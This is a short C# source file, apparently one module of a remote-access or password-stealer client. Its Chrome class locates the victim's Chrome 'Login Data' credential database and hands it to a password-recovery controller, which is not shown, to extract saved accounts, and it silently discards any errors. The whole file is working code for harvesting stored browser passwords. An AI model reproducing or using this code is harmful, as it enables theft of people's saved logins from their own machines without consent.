using Client.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client.Controllers.BrowsersControllers
{
    class Chrome
    {
        public static List<RecoveredAccount> GetSavedPasswords()
        {
            try
            {
                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Google\\Chrome\\User Data\\Default\\Login Data");
                return PasswordRecoveryController.Passwords(datapath, "Chrome");
            }
            catch (Exception)
            {
                return new List<RecoveredAccount>();
            }
        }        
    }
}
